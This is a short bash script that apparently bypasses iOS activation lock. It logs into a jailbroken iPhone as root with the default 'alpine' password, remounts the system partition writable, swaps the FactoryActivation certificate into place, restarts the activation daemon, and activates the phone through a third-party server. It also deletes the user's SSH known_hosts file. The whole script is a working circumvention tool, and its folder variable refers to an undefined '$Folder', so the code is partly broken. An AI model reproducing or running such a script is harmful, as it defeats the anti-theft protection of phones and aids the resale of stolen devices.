#!/bin/bash
folderSystem="/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates";
folderDaemon="/System/Library/LaunchDaemons";
folder="/Users/$(whoami)/Desktop/tmp";
folderBin="$Folder/libs";
$folderBin/iproxy 2222 22 &>log&rm ~/.ssh/known_hosts;
$folderBin/idevicepair pair;
$folderBin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p2222 'mount -o rw,union,update /';
$folderBin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p2222 'chflags -R nouchg '$folderSystem'';
$folderBin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p2222 'cp -rp '$folderSystem'/FactoryActivation.pem '$folderSystem'/RaptorActivation.pem';
$folderBin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p2222 'launchctl unload '$folderDaemon'/com.apple.mobileactivationd.plist';
$folderBin/sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p2222 'launchctl load '$folderDaemon'/com.apple.mobileactivationd.plist';
$folderBin/ideviceactivation activate -d -s https://bigb033xecution3r.com/iOS14/Activation/ActivateDevice.php;